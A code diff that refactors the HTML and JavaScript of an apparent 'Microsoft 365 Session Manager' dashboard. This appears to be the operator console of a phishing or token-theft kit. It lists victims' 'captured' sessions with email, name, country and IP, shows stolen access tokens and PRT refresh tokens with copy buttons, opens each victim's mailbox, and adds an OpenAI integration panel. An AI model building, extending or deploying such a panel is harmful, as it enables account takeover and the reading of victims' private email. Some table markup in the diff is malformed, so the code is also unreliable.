@@ -20,9 +20,6 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
         }
         .logo h1 {
             font-size: 20px;
@@ -72,9 +69,7 @@
             border-radius: 16px;
             border: 1px solid #1e293b;
             padding: 20px;
-            transition: transform 0.2s;
         }
-        .stat-card:hover { transform: translateY(-2px); border-color: #3b82f6; }
         .stat-card-title { font-size: 13px; color: #8b8fbf; margin-bottom: 8px; }
         .stat-card-value { font-size: 32px; font-weight: 700; color: white; }
         
@@ -115,6 +110,7 @@
         .btn-danger { background: #ef4444; color: white; }
         .btn-outline { background: transparent; border: 1px solid #2d3748; color: #e0e0e0; }
         .btn-outline:hover { background: #1e293b; }
+        .btn-success { background: #10b981; color: white; }
         
         .form-group { margin-bottom: 16px; }
         .form-group label { display: block; margin-bottom: 6px; font-size: 12px; color: #9ca3af; }
@@ -129,7 +125,6 @@
         }
         
         .grid-2 { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
-        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
         
         .country-stats-grid {
             display: grid;
@@ -143,9 +138,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            transition: transform 0.2s;
         }
-        .country-card:hover { transform: translateX(4px); }
         .country-flag { font-size: 28px; width: 45px; text-align: center; }
         .country-info { flex: 1; }
         .country-name { font-weight: 600; font-size: 14px; }
@@ -204,14 +197,7 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         
-        .badge {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 12px;
-            font-size: 10px;
-            font-weight: 500;
-        }
-        .badge-success { background: #10b981; color: white; }
+        .badge-success { background: #10b981; color: white; padding: 2px 8px; border-radius: 12px; font-size: 10px; }
         
         .view { display: none; }
         .view.active { display: block; }
@@ -228,24 +214,18 @@
             <p>Microsoft 365 Session Manager</p>
         </div>
         <div class="stats-badge">
-            <div class="stat">
-                <div class="stat-value" id="statSessions">0</div>
-                <div class="stat-label">Sessions</div>
-            </div>
-            <div class="stat">
-                <div class="stat-value" id="statPRT">0</div>
-                <div class="stat-label">PRT Tokens</div>
-            </div>
+            <div class="stat"><div class="stat-value" id="statSessions">0</div><div class="stat-label">Sessions</div></div>
+            <div class="stat"><div class="stat-value" id="statPRT">0</div><div class="stat-label">PRT Tokens</div></div>
         </div>
     </div>
     
     <div class="main">
         <div class="sidebar">
-            <div class="nav-item active" data-view="dashboard"><span>📊</span> Dashboard</div>
-            <div class="nav-item" data-view="sessions"><span>📋</span> Sessions</div>
-            <div class="nav-item" data-view="tokens"><span>🔑</span> Tokens</div>
-            <div class="nav-item" data-view="mailbox"><span>📧</span> Mailbox</div>
-            <div class="nav-item" data-view="settings"><span>⚙️</span> Settings</div>
+            <div class="nav-item active" onclick="showView('dashboard')"><span>📊</span> Dashboard</div>
+            <div class="nav-item" onclick="showView('sessions')"><span>📋</span> Sessions</div>
+            <div class="nav-item" onclick="showView('tokens')"><span>🔑</span> Tokens</div>
+            <div class="nav-item" onclick="showView('mailbox')"><span>📧</span> Mailbox</div>
+            <div class="nav-item" onclick="showView('settings')"><span>⚙️</span> Settings</div>
         </div>
         
         <div class="content">
@@ -259,12 +239,12 @@
                 </div>
                 
                 <div class="card">
-                    <div class="card-header"><span class="card-title">🌍 Active Sessions by Region</span></div>
+                    <div class="card-header"><span class="card-title">🌍 Active Sessions by Region</span><button class="btn btn-outline" onclick="loadDashboard()">Refresh</button></div>
                     <div class="card-body"><div id="countryStatsContainer" class="country-stats-grid"><div class="loading">Loading...</div></div></div>
                 </div>
                 
                 <div class="card">
-                    <div class="card-header"><span class="card-title">Recent Sessions</span><button class="btn btn-outline" onclick="loadDashboard()">Refresh</button></div>
+                    <div class="card-header"><span class="card-title">Recent Sessions</span></div>
                     <div class="table-wrapper">
                         <table id="recentTable"><thead><tr><th>Email</th><th>Name</th><th>Country</th><th>IP</th><th>Captured</th></tr></thead><tbody id="recentBody"><tr><td colspan="5" class="loading">Loading...<\/td><\/tr><\/tbody><\/table>
                     <\/div>
@@ -286,15 +266,11 @@
                 <div class="grid-2">
                     <div class="card">
                         <div class="card-header"><span class="card-title">Access Tokens<\/span><\/div>
-                        <div class="table-wrapper">
-                            <table id="accessTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Issued<\/th><th>Expires<\/th><th>Action<\/th><\/tr><\/thead><tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...<\/td><\/tr><\/tbody><\/table>
-                        <\/div>
+                        <div class="table-wrapper"><table id="accessTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Issued<\/th><th>Expires<\/th><th>Action<\/th><\/tr><\/thead><tbody id="accessTokensBody"><tr><td colspan="5" class="loading">Loading...<\/td><\/tr><\/tbody><\/table><\/div>
                     <\/div>
                     <div class="card">
                         <div class="card-header"><span class="card-title">Refresh Tokens (PRT)<\/span><\/div>
-                        <div class="table-wrapper">
-                            <table id="refreshTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Action<\/th><\/tr><\/thead><tbody id="refreshTokensBody"><td><td colspan="3" class="loading">Loading...<\/td><\/tr><\/tbody><\/table>
-                        <\/div>
+                        <div class="table-wrapper"><table id="refreshTokensTable"><thead><tr><th>User<\/th><th>Resource<\/th><th>Action<\/th><\/tr><\/thead><tbody id="refreshTokensBody"><tr><td colspan="3" class="loading">Loading...<\/td><\/tr><\/tbody><\/table><\/div>
                     <\/div>
                 <\/div>
             <\/div>
@@ -302,17 +278,11 @@
             <!-- Mailbox View -->
             <div id="mailboxView" class="view">
                 <div class="card">
-                    <div class="card-header"><span class="card-title">Select a session to open mailbox<\/span><\/div>
+                    <div class="card-header"><span class="card-title">Open User Mailbox<\/span><\/div>
                     <div class="card-body">
-                        <div class="grid-2">
-                            <div>
-                                <label>Select User Session<\/label>
-                                <select id="mailboxUserSelect" class="form-control" style="margin-top: 8px;"><option value="">Select a user...<\/option><\/select>
-                                <button class="btn btn-primary" style="margin-top: 12px;" onclick="openMailbox()">📧 Open Full Mailbox<\/button>
-                                <p style="font-size: 11px; color: #6b7280; margin-top: 8px;">Opens in a new tab with full Outlook-style interface<\/p>
-                            <\/div>
-                            <div id="mailboxInfo" class="loading">Select a user and click Open Mailbox<\/div>
-                        <\/div>
+                        <div class="form-group"><label>Select User Session</label><select id="mailboxUserSelect" class="form-control"><option value="">Loading users...<\/option><\/select><\/div>
+                        <button class="btn btn-primary" onclick="openMailbox()">📧 Open Full Mailbox</button>
+                        <p style="font-size: 11px; color: #6b7280; margin-top: 12px;">Opens in a new tab with complete Outlook-style interface<\/p>
                     <\/div>
                 <\/div>
             <\/div>
@@ -323,20 +293,16 @@
                     <div class="card">
                         <div class="card-header"><span class="card-title">Resource Selector<\/span><\/div>
                         <div class="card-body">
-                            <div class="form-group"><label>Active Resource<\/label><select id="activeResource" class="form-control"><option value="graph">Graph API (Outlook/OneDrive) - Recommended<\/option><option value="prt">PRT Token (Device Registration)<\/option><\/select><\/div>
-                            <div class="form-group"><label>API Version<\/label><select id="apiVersion" class="form-control"><option value="1">v1 (resource parameter)<\/option><option value="2">v2 (scope parameter)<\/option><\/select><\/div>
+                            <div class="form-group"><label>Active Resource<\/label><select id="activeResource" class="form-control"><option value="graph">Graph API (Outlook/OneDrive)<\/option><option value="prt">PRT Token<\/option><\/select><\/div>
                             <button class="btn btn-primary" onclick="saveResourceSettings()">Save Settings<\/button>
                         <\/div>
                     <\/div>
                     <div class="card">
                         <div class="card-header"><span class="card-title">🤖 OpenAI Integration<\/span><\/div>
                         <div class="card-body">
-                            <div class="form-group"><label>Enable AI Features<\/label><select id="openaiEnabled" class="form-control"><option value="false">Disabled<\/option><option value="true">Enabled<\/option><\/select><\/div>
+                            <div class="form-group"><label>Enable AI<\/label><select id="openaiEnabled" class="form-control"><option value="false">Disabled<\/option><option value="true">Enabled<\/option><\/select><\/div>
                             <div class="form-group"><label>API Key<\/label><input type="password" id="openaiApiKey" class="form-control" placeholder="sk-..."><\/div>
-                            <div class="form-group"><label>Model<\/label><select id="openaiModel" class="form-control"><option value="gpt-3.5-turbo">GPT-3.5 Turbo<\/option><option value="gpt-4">GPT-4<\/option><\/select><\/div>
-                            <div class="form-group"><label>Max Tokens<\/label><input type="number" id="openaiMaxTokens" class="form-control" value="500"><\/div>
-                            <div class="form-group"><label>Temperature<\/label><input type="range" id="openaiTemperature" min="0" max="2" step="0.1" value="0.7"><span id="tempValue">0.7<\/span><\/div>
-                            <button class="btn btn-primary" onclick="saveOpenAISettings()">Save OpenAI Settings<\/button>
+                            <button class="btn btn-primary" onclick="saveOpenAISettings()">Save<\/button>
                         <\/div>
                     <\/div>
                 <\/div>
@@ -348,18 +314,17 @@
     <div id="tokenModal" class="modal">
         <div class="modal-content">
             <div class="modal-header"><h3 id="tokenModalTitle">Token Details</h3><button class="btn btn-outline" onclick="closeTokenModal()">✕</button></div>
-            <div class="modal-body"><pre id="tokenModalContent" class="token-pre"></pre><button class="btn btn-primary" onclick="copyTokenToClipboard()" style="margin-top: 10px;">📋 Copy to Clipboard</button></div>
+            <div class="modal-body"><pre id="tokenModalContent" class="token-pre"></pre><button class="btn btn-primary" onclick="copyTokenToClipboard()">📋 Copy</button></div>
         </div>
     </div>
     
     <script>
-        const API_BASE = '';
         let currentTokenToCopy = '';
         
         async function apiCall(endpoint, options = {}) {
             try {
                 const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                if (!response.ok) return null;
                 return await response.json();
             } catch (err) { return null; }
         }
@@ -367,25 +332,21 @@
         function formatDate(dateStr) { return dateStr ? new Date(dateStr).toLocaleString() : 'Unknown'; }
         function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }
         
-        // Navigation
-        document.querySelectorAll('.nav-item').forEach(item => {
-            item.addEventListener('click', () => {
-                const view = item.dataset.view;
-                document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-                item.classList.add('active');
-                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-                document.getElementById(`${view}View`).classList.add('active');
-                if (view === 'dashboard') loadDashboard();
-                if (view === 'sessions') loadSessions();
-                if (view === 'tokens') loadTokens();
-                if (view === 'mailbox') loadMailboxSelect();
-                if (view === 'settings') loadSettings();
-            });
-        });
+        function showView(view) {
+            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(`${view}View`).classList.add('active');
+            event.target.classList.add('active');
+            
+            if (view === 'dashboard') loadDashboard();
+            if (view === 'sessions') loadSessions();
+            if (view === 'tokens') loadTokens();
+            if (view === 'mailbox') loadMailboxSelect();
+        }
         
         // Dashboard
         async function loadDashboard() {
-            // Load overview stats
+            // Get overview stats
             const overview = await apiCall('/api/overview_stats');
             if (overview) {
                 document.getElementById('totalVisits').innerHTML = overview.totalVisits || 0;
@@ -396,62 +357,43 @@
                 document.getElementById('statPRT').innerHTML = overview.totalPRTs || 0;
             }
             
-            // Load recent sessions
+            // Get country stats
+            const stats = await apiCall('/api/country_stats');
+            if (stats && stats.countries) {
+                const flagMap = { 'United States': '🇺🇸', 'Canada': '🇨🇦', 'United Kingdom': '🇬🇧', 'Germany': '🇩🇪', 'France': '🇫🇷', 'Japan': '🇯🇵', 'Australia': '🇦🇺', 'India': '🇮🇳', 'Netherlands': '🇳🇱', 'Sweden': '🇸🇪', 'Other': '🌍' };
+                const colorMap = { 'United States': '#B22234', 'Canada': '#FF0000', 'United Kingdom': '#00247D', 'Germany': '#FFCC00', 'France': '#0055A4', 'Japan': '#BC002D', 'Australia': '#012169', 'India': '#FF9933', 'Netherlands': '#FF7900', 'Sweden': '#005B99', 'Other': '#6B8E23' };
+                document.getElementById('countryStatsContainer').innerHTML = Object.entries(stats.countries).map(([country, count]) => `<div class="country-card" style="border-left: 4px solid ${colorMap[country] || '#6B8E23'}"><div class="country-flag">${flagMap[country] || '🌍'}</div><div class="country-info"><div class="country-name">${country}</div><div class="country-count">session(s)</div></div><div class="country-value">${count}</div></div>`).join('');
+            }
+            
+            // Get recent sessions
             const sessions = await apiCall('/api/sessions');
             if (sessions && sessions.sessions) {
                 const recent = sessions.sessions.slice(0, 5);
                 document.getElementById('recentBody').innerHTML = recent.map(s => `<tr><td style="color:#60a5fa;">${escapeHtml(s.email)}<\/td><td>${escapeHtml(s.name || '-')}<\/td><td>${escapeHtml(s.country || 'Unknown')}<\/td><td><code>${escapeHtml(s.ip || 'Unknown')}<\/code><\/td><td>${formatDate(s.capturedAt)}<\/td><\/tr>`).join('');
-            }
-            
-            await loadCountryStats();
-        }
-        
-        async function loadCountryStats() {
-            const stats = await apiCall('/api/country_stats');
-            if (stats && stats.countries) {
-                const flagMap = {
-                    'United States': '🇺🇸', 'Canada': '🇨🇦', 'United Kingdom': '🇬🇧', 'Germany': '🇩🇪',
-                    'France': '🇫🇷', 'Japan': '🇯🇵', 'Australia': '🇦🇺', 'India': '🇮🇳',
-                    'Netherlands': '🇳🇱', 'Sweden': '🇸🇪', 'Other': '🌍'
-                };
-                const colorMap = {
-                    'United States': '#B22234', 'Canada': '#FF0000', 'United Kingdom': '#00247D',
-                    'Germany': '#FFCC00', 'France': '#0055A4', 'Japan': '#BC002D', 'Australia': '#012169',
-                    'India': '#FF9933', 'Netherlands': '#FF7900', 'Sweden': '#005B99', 'Other': '#6B8E23'
-                };
-                const countriesHtml = Object.entries(stats.countries).map(([country, count]) => `
-                    <div class="country-card" style="border-left: 4px solid ${colorMap[country] || '#6B8E23'}">
-                        <div class="country-flag">${flagMap[country] || '🌍'}</div>
-                        <div class="country-info">
-                            <div class="country-name">${country}</div>
-                            <div class="country-count">session(s)</div>
-                        </div>
-                        <div class="country-value">${count}</div>
-                    </div>
-                `).join('');
-                document.getElementById('countryStatsContainer').innerHTML = countriesHtml || '<div>No data</div>';
             }
         }
         
         // Sessions
         async function loadSessions() {
             const data = await apiCall('/api/sessions');
-            if (data && data.sessions) {
+            if (data && data.sessions && data.sessions.length > 0) {
                 document.getElementById('sessionsBody').innerHTML = data.sessions.map(s => `<tr>
                     <td>${s.id}<\/td>
                     <td style="color:#60a5fa;">${escapeHtml(s.email)}<\/td>
                     <td>${escapeHtml(s.name || '-')}<\/td>
                     <td>${escapeHtml(s.country || 'Unknown')}<\/td>
                     <td><code>${escapeHtml(s.ip || 'Unknown')}<\/code><\/td>
-                    <td><span class="badge badge-success">${escapeHtml(s.type || 'Graph API')}<\/span><\/td>
+                    <td><span class="badge-success">${escapeHtml(s.type || 'Graph API')}<\/span><\/td>
                     <td>${formatDate(s.capturedAt)}<\/td>
                     <td>${s.hasPRT ? 'Permanent (PRT)' : formatDate(s.expiresAt)}<\/td>
                     <td>
-                        <button class="btn btn-outline" style="padding: 2px 6px; margin: 2px;" onclick="viewToken('${escapeHtml(s.email)}', 'access')">🔑 Access Token<\/button>
-                        ${s.hasPRT ? `<button class="btn btn-outline" style="padding: 2px 6px; margin: 2px;" onclick="viewToken('${escapeHtml(s.email)}', 'prt')">🔄 PRT<\/button>` : ''}
-                        <button class="btn btn-primary" style="padding: 2px 6px; margin: 2px;" onclick="openFullMailbox('${escapeHtml(s.email)}')">📧 Open Mailbox<\/button>
+                        <button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewToken('${escapeHtml(s.email)}', 'access')">🔑 Token<\/button>
+                        ${s.hasPRT ? `<button class="btn btn-outline" style="padding: 2px 6px;" onclick="viewToken('${escapeHtml(s.email)}', 'prt')">🔄 PRT<\/button>` : ''}
+                        <button class="btn btn-primary" style="padding: 2px 6px;" onclick="openFullMailbox('${escapeHtml(s.email)}')">📧 Mailbox<\/button>
                     <\/td>
                 <\/tr>`).join('');
+            } else {
+                document.getElementById('sessionsBody').innerHTML = '<tr><td colspan="9" class="loading">No sessions yet. Authenticate first.<\/td><\/tr>';
             }
         }
         
@@ -459,10 +401,9 @@
             const data = await apiCall(`/api/session/token/${encodeURIComponent(email)}`);
             if (data) {
                 const token = type === 'access' ? data.access_token : data.refresh_token;
-                const title = type === 'access' ? `🔐 Access Token - ${email}` : `🔄 PRT (Refresh Token) - ${email}`;
                 if (token) {
                     currentTokenToCopy = token;
-                    document.getElementById('tokenModalTitle').innerHTML = title;
+                    document.getElementById('tokenModalTitle').innerHTML = type === 'access' ? `🔐 Access Token - ${email}` : `🔄 PRT - ${email}`;
                     document.getElementById('tokenModalContent').innerHTML = token;
                     document.getElementById('tokenModal').classList.add('open');
                 } else {
@@ -473,15 +414,11 @@
             }
         }
         
-        function copyTokenToClipboard() {
-            navigator.clipboard.writeText(currentTokenToCopy);
-            alert('Token copied to clipboard!');
-        }
-        
+        function copyTokenToClipboard() { navigator.clipboard.writeText(currentTokenToCopy); alert('Copied!'); }
         function closeTokenModal() { document.getElementById('tokenModal').classList.remove('open'); }
         
         async function clearAllSessions() {
-            if (confirm('⚠️ Clear all sessions? This will delete ALL tokens.')) { 
+            if (confirm('Clear all sessions?')) { 
                 await apiCall('/api/sessions/clear', { method: 'DELETE' }); 
                 loadDashboard(); 
                 loadSessions(); 
@@ -492,25 +429,35 @@
         // Tokens
         async function loadTokens() {
             const accessTokens = await apiCall('/api/list_access_tokens');
-            if (accessTokens) { document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<tr><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td>${formatDate(t.issued_at)}<\/td><td>${formatDate(t.expires_at)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy<\/button><\/td><\/tr>`).join(''); }
+            if (accessTokens && accessTokens.length > 0) {
+                document.getElementById('accessTokensBody').innerHTML = accessTokens.map(t => `<td><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td>${formatDate(t.issued_at)}<\/td><td>${formatDate(t.expires_at)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.accesstoken)}')">Copy<\/button><\/td><\/tr>`).join('');
+            } else {
+                document.getElementById('accessTokensBody').innerHTML = '<tr><td colspan="5" class="loading">No access tokens<\/td><\/tr>';
+            }
+            
             const refreshTokens = await apiCall('/api/list_refresh_tokens');
-            if (refreshTokens) { document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<td><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT<\/button><\/td><\/tr>`).join(''); }
+            if (refreshTokens && refreshTokens.length > 0) {
+                document.getElementById('refreshTokensBody').innerHTML = refreshTokens.map(t => `<td><td style="color:#60a5fa;">${escapeHtml(t.user)}<\/td><td>${escapeHtml(t.resource)}<\/td><td><button class="btn btn-outline" onclick="copyToken('${escapeHtml(t.refreshtoken)}')">Copy PRT<\/button><\/td><\/tr>`).join('');
+            } else {
+                document.getElementById('refreshTokensBody').innerHTML = '<tr><td colspan="3" class="loading">No PRT tokens<\/td><\/tr>';
+            }
         }
         
-        function copyToken(token) { navigator.clipboard.writeText(token); alert('Token copied!'); }
+        function copyToken(token) { navigator.clipboard.writeText(token); alert('Copied!'); }
         
-        // Mailbox - Opens in new tab
-        function openFullMailbox(email) {
-            window.open(`/mailbox.html?email=${encodeURIComponent(email)}`, '_blank', 'width=1400,height=900');
-        }
-        
+        // Mailbox
         async function loadMailboxSelect() {
             const sessions = await apiCall('/api/sessions');
             const select = document.getElementById('mailboxUserSelect');
-            if (sessions && sessions.sessions) { 
+            if (sessions && sessions.sessions && sessions.sessions.length > 0) {
                 select.innerHTML = '<option value="">Select a user...</option>' + sessions.sessions.map(s => `<option value="${escapeHtml(s.email)}">${escapeHtml(s.email)} (${escapeHtml(s.name || 'No name')})</option>`).join('');
-                document.getElementById('mailboxInfo').innerHTML = '<p style="color: #60a5fa;">✅ Ready - Select a user and click "Open Full Mailbox"</p>';
+            } else {
+                select.innerHTML = '<option value="">No sessions yet. Authenticate first.</option>';
             }
+        }
+        
+        function openFullMailbox(email) {
+            window.open(`/mailbox.html?email=${encodeURIComponent(email)}`, '_blank', 'width=1400,height=900');
         }
         
         async function openMailbox() {
@@ -520,33 +467,21 @@
         }
         
         // Settings
-        async function loadSettings() {
-            const settings = await apiCall('/api/settings');
-            if (settings) {
-                document.getElementById('activeResource').value = settings.active_resource || 'graph';
-                document.getElementById('apiVersion').value = settings.api_version || '2';
-                document.getElementById('openaiEnabled').value = settings.openai_enabled ? 'true' : 'false';
-                document.getElementById('openaiApiKey').value = settings.openai_api_key || '';
-                document.getElementById('openaiModel').value = settings.openai_model || 'gpt-3.5-turbo';
-                document.getElementById('openaiMaxTokens').value = settings.openai_max_tokens || 500;
-                document.getElementById('openaiTemperature').value = settings.openai_temperature || 0.7;
-                document.getElementById('tempValue').innerHTML = settings.openai_temperature || 0.7;
-            }
-        }
-        
         async function saveResourceSettings() {
-            await apiCall('/api/resource/settings', { method: 'POST', body: JSON.stringify({ active_resource: document.getElementById('activeResource').value, api_version: document.getElementById('apiVersion').value }) });
-            alert('Settings saved! Graph API is recommended for mailbox access.');
+            await apiCall('/api/resource/settings', { method: 'POST', body: JSON.stringify({ active_resource: document.getElementById('activeResource').value }) });
+            alert('Settings saved!');
         }
         
         async function saveOpenAISettings() {
-            await apiCall('/api/openai/settings', { method: 'POST', body: JSON.stringify({ enabled: document.getElementById('openaiEnabled').value === 'true', api_key: document.getElementById('openaiApiKey').value, model: document.getElementById('openaiModel').value, max_tokens: parseInt(document.getElementById('openaiMaxTokens').value), temperature: parseFloat(document.getElementById('openaiTemperature').value) }) });
+            await apiCall('/api/openai/settings', { method: 'POST', body: JSON.stringify({ enabled: document.getElementById('openaiEnabled').value === 'true', api_key: document.getElementById('openaiApiKey').value }) });
             alert('OpenAI settings saved!');
         }
         
-        document.getElementById('openaiTemperature').addEventListener('input', function() { document.getElementById('tempValue').innerHTML = this.value; });
-        
+        // Load dashboard on page load
         loadDashboard();
+        loadSessions();
+        loadTokens();
+        loadMailboxSelect();
     </script>
 </body>
 </html>
